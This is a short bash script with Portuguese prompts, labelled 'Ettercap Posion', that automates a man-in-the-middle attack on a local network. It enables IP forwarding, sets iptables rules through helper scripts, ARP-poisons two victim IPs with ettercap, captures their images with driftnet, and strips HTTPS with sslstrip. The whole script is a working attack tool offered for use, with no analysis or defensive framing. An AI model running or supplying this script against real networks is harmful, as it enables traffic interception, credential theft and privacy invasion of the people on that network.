#GNUH TIPS
clear

#COLOR CONFIG
red='\e[0;31m'
blue='\e[0;34m'
green='\e[0;32m'
NC='\e[00m'
#

./apagar_iptables.sh #limpar iptables
./rules.sh #configurar iptables

echo -e  "${blue}tByte - Ettercap ${green}Posion${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward
iwconfig 

read -e -p "Digite a Interface: " i
read -e -p "IP1: " ip1
read -e -p "IP2: " ip2
read -s -p "aperte ENTER para executar."

gnome-terminal --zoom=.7 -x ettercap -Tqi $i -M arp /$ip1/ /$ip2/
driftnet -i $i &
sslstrip -a -l 8080

./apagar_iptables.sh
